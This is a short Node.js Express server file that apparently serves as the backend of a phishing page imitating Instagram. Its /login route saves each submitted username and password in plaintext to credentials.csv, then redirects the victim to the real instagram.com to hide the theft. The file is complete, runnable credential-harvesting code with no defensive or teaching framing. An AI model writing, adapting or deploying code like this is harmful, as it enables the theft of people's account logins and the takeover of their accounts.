import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import { appendToCsv } from './utils/fileOps.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use('/public', express.static(path.join(__dirname, '../public')));
app.use('/icons', express.static(path.join(__dirname, '../icons')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../index.html'));
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;

  appendToCsv({ username, password }, 'credentials.csv');
  res.redirect('https://www.instagram.com');
});

app.listen(5500, () => {
  console.log('Server is running on http://localhost:5500');
});
